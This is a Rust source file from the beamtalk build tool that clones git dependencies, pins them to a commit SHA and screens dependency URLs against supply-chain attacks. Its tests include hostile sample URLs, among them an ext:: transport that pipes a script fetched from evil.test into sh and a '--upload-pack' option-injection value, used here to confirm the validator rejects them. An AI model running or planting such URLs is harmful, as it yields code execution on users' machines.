// Copyright 2026 James Casey
// SPDX-License-Identifier: Apache-2.0

//! Git dependency resolution (ADR 0070 Phase 1).
//!
//! **DDD Context:** Build System
//!
//! Clones git repositories to `_build/deps/{name}/` and checks out the
//! requested reference (tag, branch, or rev). Resolves each checkout to an
//! exact commit SHA for lockfile pinning.

use beamtalk_core::compilation::GitReference;
use camino::{Utf8Path, Utf8PathBuf};
use miette::{Context, IntoDiagnostic, Result};
use std::process::Command;
use tracing::{debug, info};

use super::lockfile::LockEntry;

/// Result of resolving a single git dependency.
#[derive(Debug, Clone)]
pub struct ResolvedGitDep {
    /// The dependency name.
    pub name: String,
    /// The git repository URL.
    pub url: String,
    /// The requested reference (tag/branch/rev).
    pub reference: GitReference,
    /// The exact commit SHA that the reference resolved to.
    pub resolved_sha: String,
    /// The path where the dependency was cloned.
    pub checkout_path: Utf8PathBuf,
}

/// Clone a git dependency into `_build/deps/{name}/` and check out the requested reference.
///
/// If a lockfile entry is provided and its SHA matches the current clone, the clone is
/// skipped. Otherwise, a fresh clone is performed.
///
/// Returns the resolved dependency with the exact commit SHA.
///
/// # Errors
///
/// Returns an error if:
/// - The git URL is unreachable or invalid
/// - The requested tag/branch/rev does not exist
/// - Git commands fail
pub fn resolve_git_dep(
    name: &str,
    url: &str,
    reference: &GitReference,
    project_root: &Utf8Path,
    lock_entry: Option<&LockEntry>,
) -> Result<ResolvedGitDep> {
    let deps_dir = crate::commands::build_layout::BuildLayout::new(project_root).deps_dir();
    let checkout_path = deps_dir.join(name);

    // Check if we can skip re-clone based on lockfile.
    //
    // A lock entry pins a SHA for one specific (url, reference) request, so it
    // only licenses skipping the clone while the manifest still asks for that
    // same request. Once `beamtalk.toml` names a different tag/branch/rev — or
    // a different repository — the pin no longer describes what was asked for,
    // and reusing it would silently keep building the previously locked commit.
    // (A *matching* reference still reuses the pinned SHA: that is what makes
    // a locked branch dependency reproducible until `deps update`.)
    if let Some(entry) = lock_entry.filter(|e| e.url == url && e.reference == *reference) {
        if checkout_path.exists() && verify_checkout(name, &checkout_path, &entry.resolved_sha) {
            info!(name, sha = %entry.resolved_sha, "Git dependency up-to-date, skipping clone");
            return Ok(ResolvedGitDep {
                name: name.to_string(),
                url: url.to_string(),
                reference: reference.clone(),
                resolved_sha: entry.resolved_sha.clone(),
                checkout_path,
            });
        }
    }

    // Ensure the deps directory exists
    std::fs::create_dir_all(&deps_dir)
        .into_diagnostic()
        .wrap_err_with(|| format!("Failed to create deps directory '{deps_dir}'"))?;

    // Remove any existing checkout for a clean clone
    if checkout_path.exists() {
        debug!(name, "Removing stale checkout for re-clone");
        std::fs::remove_dir_all(&checkout_path)
            .into_diagnostic()
            .wrap_err_with(|| format!("Failed to remove existing checkout at '{checkout_path}'"))?;
    }

    // Clone the repository
    info!(name, url, "Cloning git dependency");
    clone_repo(name, url, &checkout_path)?;

    // Check out the requested reference
    checkout_ref(name, reference, &checkout_path)?;

    // Resolve to exact commit SHA
    let resolved_sha = resolve_head_sha(name, &checkout_path)?;
    info!(name, sha = %resolved_sha, "Resolved git dependency");

    Ok(ResolvedGitDep {
        name: name.to_string(),
        url: url.to_string(),
        reference: reference.clone(),
        resolved_sha,
        checkout_path,
    })
}

/// Clone a git repository to the given path.
///
/// The URL is passed after `--` and screened by [`validate_git_url`] so it can
/// never be read as a git option, and the `ext::` transport — which executes an
/// arbitrary shell command — is disabled for the duration of the clone. Both
/// matter because a registry dependency's URL comes from the registry index
/// rather than from the user's own `beamtalk.toml`.
fn clone_repo(name: &str, url: &str, target: &Utf8Path) -> Result<()> {
    validate_git_url(name, url)?;

    let output = Command::new("git")
        .args([
            "-c",
            "protocol.ext.allow=never",
            "clone",
            "--quiet",
            "--",
            url,
            target.as_str(),
        ])
        .output()
        .into_diagnostic()
        .wrap_err_with(|| format!("Failed to execute 'git clone' for dependency '{name}'"))?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        miette::bail!(
            "Failed to clone git dependency '{name}' from '{url}'\n\n\
             git clone failed:\n{stderr}\n\n\
             Check that the URL is correct and accessible."
        );
    }

    Ok(())
}

/// Transports a dependency URL may legitimately use.
///
/// Deliberately excludes git's `ext::` and `fd::` helper transports: `ext::`
/// runs an arbitrary shell command, so a URL carrying it is code execution, not
/// a fetch.
const ALLOWED_URL_SCHEMES: &[&str] = &["https://", "http://", "ssh://", "git://", "file://"];

/// Reject dependency URLs that git would not treat as a plain remote.
///
/// Registry dependencies take their URL from the registry index — third-party
/// data — so this runs on every clone rather than trusting the manifest author.
///
/// # Errors
///
/// Returns an error if the URL is empty, looks like a command-line option, or
/// uses a transport outside [`ALLOWED_URL_SCHEMES`].
pub fn validate_git_url(name: &str, url: &str) -> Result<()> {
    if url.trim().is_empty() {
        miette::bail!("Dependency '{name}' has an empty git URL");
    }

    if url.starts_with('-') {
        miette::bail!(
            "Dependency '{name}' has an invalid git URL '{url}' — \
             a URL may not begin with '-' (it would be read as a git option)."
        );
    }

    if ALLOWED_URL_SCHEMES
        .iter()
        .any(|scheme| url.starts_with(scheme))
    {
        return Ok(());
    }

    // Anything of the form `<helper>::<address>` is git's transport-helper
    // syntax, which dispatches to `git-remote-<helper>` — `ext::` being the
    // shell-executing one. None of the allowed schemes reach here, so a `::`
    // at this point can only be a helper invocation.
    if url.contains("::") {
        miette::bail!(
            "Dependency '{name}' has an unsupported git URL '{url}'.\n\n  \
             '<transport>::' URLs are rejected: git dispatches them to a remote \
             helper, and 'ext::' in particular executes an arbitrary command."
        );
    }

    // `user@host:path` scp-style syntax has no scheme but is a normal git
    // remote. Accept it only when it really looks like one: a non-empty host
    // segment before the first colon that carries no slash, and a path that
    // does not begin with `//`.
    //
    // That last condition is what keeps an unrecognised *scheme* out. Without
    // it `badscheme://host/repo` splits into ("badscheme", "//host/repo") and
    // reads as scp-style, and git would go looking for `git-remote-badscheme`
    // on PATH — `protocol.ext.allow=never` only disables the built-in `ext::`
    // helper, not arbitrary installed transport programs. A real scp-style
    // path never starts with `//`.
    let scp_like = url.split_once(':').is_some_and(|(host, path)| {
        !host.is_empty() && !host.contains('/') && !path.starts_with("//")
    });

    if !scp_like {
        miette::bail!(
            "Dependency '{name}' has an unsupported git URL '{url}'.\n\n  \
             Supported forms are https://, http://, ssh://, git://, file://, \
             and user@host:path."
        );
    }

    Ok(())
}

/// Check out the requested reference (tag, branch, or rev).
fn checkout_ref(name: &str, reference: &GitReference, repo_path: &Utf8Path) -> Result<()> {
    let (ref_type, ref_value) = match reference {
        GitReference::Tag(tag) => ("tag", tag.as_str()),
        GitReference::Branch(branch) => ("branch", branch.as_str()),
        GitReference::Rev(rev) => ("rev", rev.as_str()),
    };

    debug!(name, ref_type, ref_value, "Checking out git reference");

    let checkout_target = match reference {
        // For tags, use the full refs/tags/ path to avoid ambiguity
        GitReference::Tag(tag) => format!("refs/tags/{tag}"),
        GitReference::Branch(branch) => format!("origin/{branch}"),
        GitReference::Rev(rev) => rev.clone(),
    };

    let output = Command::new("git")
        .args(["checkout", "--quiet", "--detach", &checkout_target])
        .current_dir(repo_path)
        .output()
        .into_diagnostic()
        .wrap_err_with(|| format!("Failed to execute 'git checkout' for dependency '{name}'"))?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        miette::bail!(
            "Failed to check out {ref_type} '{ref_value}' for dependency '{name}'\n\n\
             git checkout failed:\n{stderr}\n\n\
             Check that the {ref_type} exists in the repository."
        );
    }

    Ok(())
}

/// Resolve the current HEAD to an exact commit SHA.
fn resolve_head_sha(name: &str, repo_path: &Utf8Path) -> Result<String> {
    let output = Command::new("git")
        .args(["rev-parse", "HEAD"])
        .current_dir(repo_path)
        .output()
        .into_diagnostic()
        .wrap_err_with(|| {
            format!("Failed to execute 'git rev-parse HEAD' for dependency '{name}'")
        })?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        miette::bail!(
            "Failed to resolve commit SHA for dependency '{name}'\n\n\
             git rev-parse failed:\n{stderr}"
        );
    }

    let sha = String::from_utf8_lossy(&output.stdout).trim().to_string();
    if sha.is_empty() {
        miette::bail!("git rev-parse HEAD returned empty SHA for dependency '{name}'");
    }

    Ok(sha)
}

/// Verify that an existing checkout matches the expected SHA.
///
/// Returns `true` if the checkout's HEAD matches the expected SHA.
/// Returns `false` if the SHA cannot be resolved (stale/corrupt checkout).
fn verify_checkout(name: &str, repo_path: &Utf8Path, expected_sha: &str) -> bool {
    if let Ok(sha) = resolve_head_sha(name, repo_path) {
        sha == expected_sha
    } else {
        debug!(
            name,
            "Could not resolve HEAD in existing checkout, will re-clone"
        );
        false
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    /// Create a bare git repo with a single commit, a tag, and a branch.
    /// Returns (`repo_dir_tempdir`, `repo_url`, `commit_sha`).
    fn create_test_repo() -> (TempDir, String, String) {
        let repo_dir = TempDir::new().unwrap();
        let repo_path = repo_dir.path();

        // Init a bare-ish repo (we'll use it as a local remote)
        run_git(repo_path, &["init"]);
        run_git(repo_path, &["config", "user.email", "test@test.com"]);
        run_git(repo_path, &["config", "user.name", "Test"]);
        run_git(repo_path, &["config", "commit.gpgsign", "false"]);

        // Create a beamtalk.toml so it looks like a valid package
        std::fs::write(
            repo_path.join("beamtalk.toml"),
            "[package]\nname = \"test_dep\"\nversion = \"0.1.0\"\n",
        )
        .unwrap();

        run_git(repo_path, &["add", "."]);
        run_git(repo_path, &["commit", "-m", "initial"]);

        // Create a lightweight tag
        run_git(repo_path, &["tag", "-m", "v1.0.0", "v1.0.0"]);

        // Create a branch
        run_git(repo_path, &["branch", "develop"]);

        // Get the commit SHA
        let sha = get_git_sha(repo_path);

        // file:// URLs need forward slashes. On Windows, paths don't start with
        // `/`, so we prepend one to get `file:///C:/...`. On Unix, `display()`
        // already starts with `/`, giving `file:///tmp/...` (BT-1737).
        let mut path_str = repo_path.display().to_string().replace('\\', "/");
        if !path_str.starts_with('/') {
            path_str.insert(0, '/');
        }
        let url = format!("file://{path_str}");
        (repo_dir, url, sha)
    }

    fn run_git(dir: &std::path::Path, args: &[&str]) {
        let output = Command::new("git")
            .args(args)
            .current_dir(dir)
            .output()
            .unwrap();
        assert!(
            output.status.success(),
            "git {:?} failed: {}",
            args,
            String::from_utf8_lossy(&output.stderr)
        );
    }

    fn get_git_sha(dir: &std::path::Path) -> String {
        let output = Command::new("git")
            .args(["rev-parse", "HEAD"])
            .current_dir(dir)
            .output()
            .unwrap();
        String::from_utf8_lossy(&output.stdout).trim().to_string()
    }

    #[test]
    fn test_resolve_git_dep_with_tag() {
        let (_repo, url, expected_sha) = create_test_repo();
        let project_dir = TempDir::new().unwrap();
        let project_root = Utf8PathBuf::from_path_buf(project_dir.path().to_path_buf()).unwrap();

        let result = resolve_git_dep(
            "test_dep",
            &url,
            &GitReference::Tag("v1.0.0".to_string()),
            &project_root,
            None,
        )
        .unwrap();

        assert_eq!(result.name, "test_dep");
        assert_eq!(result.resolved_sha, expected_sha);
        assert!(result.checkout_path.exists());
        // Verify beamtalk.toml exists in the checkout
        assert!(result.checkout_path.join("beamtalk.toml").exists());
    }

    #[test]
    fn test_resolve_git_dep_with_branch() {
        let (_repo, url, expected_sha) = create_test_repo();
        let project_dir = TempDir::new().unwrap();
        let project_root = Utf8PathBuf::from_path_buf(project_dir.path().to_path_buf()).unwrap();

        let result = resolve_git_dep(
            "test_dep",
            &url,
            &GitReference::Branch("develop".to_string()),
            &project_root,
            None,
        )
        .unwrap();

        assert_eq!(result.resolved_sha, expected_sha);
    }

    #[test]
    fn test_resolve_git_dep_with_rev() {
        let (_repo, url, expected_sha) = create_test_repo();
        let project_dir = TempDir::new().unwrap();
        let project_root = Utf8PathBuf::from_path_buf(project_dir.path().to_path_buf()).unwrap();

        let result = resolve_git_dep(
            "test_dep",
            &url,
            &GitReference::Rev(expected_sha.clone()),
            &project_root,
            None,
        )
        .unwrap();

        assert_eq!(result.resolved_sha, expected_sha);
    }

    #[test]
    fn test_skip_reclone_when_lockfile_matches() {
        let (_repo, url, expected_sha) = create_test_repo();
        let project_dir = TempDir::new().unwrap();
        let project_root = Utf8PathBuf::from_path_buf(project_dir.path().to_path_buf()).unwrap();

        // First clone
        let result = resolve_git_dep(
            "test_dep",
            &url,
            &GitReference::Tag("v1.0.0".to_string()),
            &project_root,
            None,
        )
        .unwrap();

        // Write a marker file so we can verify the directory wasn't re-created
        let marker = result.checkout_path.join(".test_marker");
        std::fs::write(&marker, "present").unwrap();

        // Second resolve with matching lock entry should skip
        let lock_entry = LockEntry {
            name: "test_dep".to_string(),
            url: url.clone(),
            reference: GitReference::Tag("v1.0.0".to_string()),
            resolved_sha: expected_sha.clone(),
            registry_version: None,
        };

        let result2 = resolve_git_dep(
            "test_dep",
            &url,
            &GitReference::Tag("v1.0.0".to_string()),
            &project_root,
            Some(&lock_entry),
        )
        .unwrap();

        assert_eq!(result2.resolved_sha, expected_sha);
        // Marker file should still be there (directory wasn't deleted)
        assert!(marker.exists(), "Should have skipped re-clone");
    }

    #[test]
    fn test_reclone_when_lockfile_sha_mismatch() {
        let (_repo, url, expected_sha) = create_test_repo();
        let project_dir = TempDir::new().unwrap();
        let project_root = Utf8PathBuf::from_path_buf(project_dir.path().to_path_buf()).unwrap();

        // First clone
        let result = resolve_git_dep(
            "test_dep",
            &url,
            &GitReference::Tag("v1.0.0".to_string()),
            &project_root,
            None,
        )
        .unwrap();

        // Write a marker file
        let marker = result.checkout_path.join(".test_marker");
        std::fs::write(&marker, "present").unwrap();

        // Resolve with mismatched SHA should re-clone
        let lock_entry = LockEntry {
            name: "test_dep".to_string(),
            url: url.clone(),
            reference: GitReference::Tag("v1.0.0".to_string()),
            resolved_sha: "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef".to_string(),
            registry_version: None,
        };

        let result2 = resolve_git_dep(
            "test_dep",
            &url,
            &GitReference::Tag("v1.0.0".to_string()),
            &project_root,
            Some(&lock_entry),
        )
        .unwrap();

        assert_eq!(result2.resolved_sha, expected_sha);
        // Marker file should be gone (directory was re-created)
        assert!(!marker.exists(), "Should have re-cloned");
    }

    /// Changing the requested ref in `beamtalk.toml` must refetch, even though
    /// the old checkout still matches the old lockfile SHA.
    ///
    /// Regression: the skip-clone check only compared the recorded SHA against
    /// the checkout's HEAD, never the *requested* reference — so bumping a tag
    /// silently kept building the previously locked commit.
    #[test]
    fn test_reclone_when_requested_ref_differs_from_lock() {
        let (_repo, url, expected_sha) = create_test_repo();
        let project_dir = TempDir::new().unwrap();
        let project_root = Utf8PathBuf::from_path_buf(project_dir.path().to_path_buf()).unwrap();

        let result = resolve_git_dep(
            "test_dep",
            &url,
            &GitReference::Tag("v1.0.0".to_string()),
            &project_root,
            None,
        )
        .unwrap();

        let marker = result.checkout_path.join(".test_marker");
        std::fs::write(&marker, "present").unwrap();

        // The lock still pins the tag, but the manifest now asks for a branch.
        let lock_entry = LockEntry {
            name: "test_dep".to_string(),
            url: url.clone(),
            reference: GitReference::Tag("v1.0.0".to_string()),
            resolved_sha: expected_sha.clone(),
            registry_version: None,
        };

        let result2 = resolve_git_dep(
            "test_dep",
            &url,
            &GitReference::Branch("develop".to_string()),
            &project_root,
            Some(&lock_entry),
        )
        .unwrap();

        assert_eq!(result2.resolved_sha, expected_sha);
        assert!(
            !marker.exists(),
            "A changed reference must force a re-clone"
        );
    }

    /// The same applies to the repository URL: a lock entry for a different
    /// remote must not license reusing the checkout.
    #[test]
    fn test_reclone_when_requested_url_differs_from_lock() {
        let (_repo, url, expected_sha) = create_test_repo();
        let project_dir = TempDir::new().unwrap();
        let project_root = Utf8PathBuf::from_path_buf(project_dir.path().to_path_buf()).unwrap();

        let result = resolve_git_dep(
            "test_dep",
            &url,
            &GitReference::Tag("v1.0.0".to_string()),
            &project_root,
            None,
        )
        .unwrap();

        let marker = result.checkout_path.join(".test_marker");
        std::fs::write(&marker, "present").unwrap();

        let lock_entry = LockEntry {
            name: "test_dep".to_string(),
            url: "file:///some/other/repo".to_string(),
            reference: GitReference::Tag("v1.0.0".to_string()),
            resolved_sha: expected_sha.clone(),
            registry_version: None,
        };

        let result2 = resolve_git_dep(
            "test_dep",
            &url,
            &GitReference::Tag("v1.0.0".to_string()),
            &project_root,
            Some(&lock_entry),
        )
        .unwrap();

        assert_eq!(result2.resolved_sha, expected_sha);
        assert!(!marker.exists(), "A changed URL must force a re-clone");
    }

    // ── URL validation ───────────────────────────────────────────────
    //
    // A registry dependency's URL comes from the registry index, so these are
    // supply-chain guards, not just typo protection.

    #[test]
    fn test_validate_git_url_accepts_normal_remotes() {
        for url in [
            "https://github.com/jamesc/beamtalk-json",
            "http://example.test/repo.git",
            "ssh://git@example.test/repo.git",
            "git://example.test/repo.git",
            "file:///tmp/repo",
            "git@github.com:jamesc/beamtalk-json.git",
        ] {
            assert!(validate_git_url("dep", url).is_ok(), "should accept {url}");
        }
    }

    #[test]
    fn test_validate_git_url_rejects_ext_transport() {
        // `ext::` makes git run an arbitrary command — remote code execution
        // if it reaches `git clone`.
        let err = validate_git_url("dep", "ext::sh -c 'curl evil.test/x.sh|sh'").unwrap_err();
        let msg = format!("{err:?}");
        assert!(msg.contains("unsupported git URL"), "{msg}");
    }

    #[test]
    fn test_validate_git_url_rejects_other_transport_helpers() {
        assert!(validate_git_url("dep", "fd::7").is_err());
        assert!(validate_git_url("dep", "transport::whatever").is_err());
    }

    #[test]
    fn test_validate_git_url_rejects_unknown_scheme() {
        // Would otherwise read as scp-style and send git looking for
        // `git-remote-<scheme>` on PATH.
        for url in [
            "gitremote://evil.test/repo",
            "badscheme://host/repo",
            "git+ssh://host/repo",
        ] {
            assert!(validate_git_url("dep", url).is_err(), "should reject {url}");
        }
    }

    #[test]
    fn test_validate_git_url_rejects_option_lookalike() {
        // Sits in a positional slot, so git would parse it as an option.
        let err = validate_git_url("dep", "--upload-pack=touch /tmp/pwned").unwrap_err();
        let msg = format!("{err:?}");
        assert!(msg.contains("may not begin with"), "{msg}");
    }

    #[test]
    fn test_validate_git_url_rejects_empty() {
        assert!(validate_git_url("dep", "  ").is_err());
    }

    #[test]
    fn test_resolve_git_dep_rejects_dangerous_url() {
        let project_dir = TempDir::new().unwrap();
        let project_root = Utf8PathBuf::from_path_buf(project_dir.path().to_path_buf()).unwrap();

        let result = resolve_git_dep(
            "evil",
            "ext::sh -c 'touch /tmp/beamtalk_pwned'",
            &GitReference::Tag("v1.0.0".to_string()),
            &project_root,
            None,
        );

        assert!(result.is_err(), "dangerous URL must not reach git clone");
    }

    #[test]
    fn test_error_on_unreachable_url() {
        let project_dir = TempDir::new().unwrap();
        let project_root = Utf8PathBuf::from_path_buf(project_dir.path().to_path_buf()).unwrap();

        let result = resolve_git_dep(
            "bad_dep",
            "https://example.invalid/nonexistent/repo.git",
            &GitReference::Tag("v1.0.0".to_string()),
            &project_root,
            None,
        );

        assert!(result.is_err());
        let err = format!("{:?}", result.unwrap_err());
        assert!(
            err.contains("Failed to clone") || err.contains("bad_dep"),
            "Error should mention the dependency: {err}"
        );
    }

    #[test]
    fn test_error_on_nonexistent_tag() {
        let (_repo, url, _sha) = create_test_repo();
        let project_dir = TempDir::new().unwrap();
        let project_root = Utf8PathBuf::from_path_buf(project_dir.path().to_path_buf()).unwrap();

        let result = resolve_git_dep(
            "test_dep",
            &url,
            &GitReference::Tag("v99.99.99".to_string()),
            &project_root,
            None,
        );

        assert!(result.is_err());
        let err = format!("{:?}", result.unwrap_err());
        assert!(
            err.contains("tag") || err.contains("v99.99.99"),
            "Error should mention the tag: {err}"
        );
    }
}
